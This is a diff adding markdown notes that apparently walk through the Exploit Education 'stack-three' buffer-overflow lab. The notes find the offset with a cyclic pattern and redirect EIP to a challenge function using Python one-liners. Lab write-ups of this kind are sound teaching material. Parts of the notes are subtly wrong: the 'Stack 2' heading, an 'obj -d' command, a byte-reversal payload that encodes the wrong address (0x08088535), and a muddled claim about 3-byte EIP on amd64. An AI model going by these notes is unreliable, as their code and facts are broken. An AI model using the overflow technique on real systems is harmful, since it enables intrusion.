@@ -121,6 +121,43 @@ os.system("ExploitEducation=$(python3 -c 'print(\"A\"*64 + \"\\x0a\\x09\\x0a\\x0
 ```
 
 
+# Stack 2
+
+```bash
+obj -d stack-three
+```
+We notice a function called "complete_challenge" located at address: 0x08048535, lets see if we can call
+that function with a BoF. 
+
+```bash
+pattern_create -l 200
+```
+
+echo "$(pattern_create -l 200)" | ./stack-three
+>exact match at 64
+
+So we know our buffer is 64 bytes long before we overwrite EIP. 
+
+```bash
+python -c 'print "A"*64 + "\x35\x85\x04\x08"' | ./stack-three
+```
+
+The amd64 implementation of this is almost exactly the same except the memory address passed in EIP is only
+3 bytes long, I have to research why that is the fact. 
+
+An alternative to writing these exploits in little endian, is to use a little-known string reversal function
+provided in python:
+
+myString="hello"
+myString[::-1]
+>'olleh'
+
+```bash
+python -c 'print "A"*64 + "\x08\x08\x85\x35"[::-1]' | ./stack-three
+```
+
+
+
 
 
 
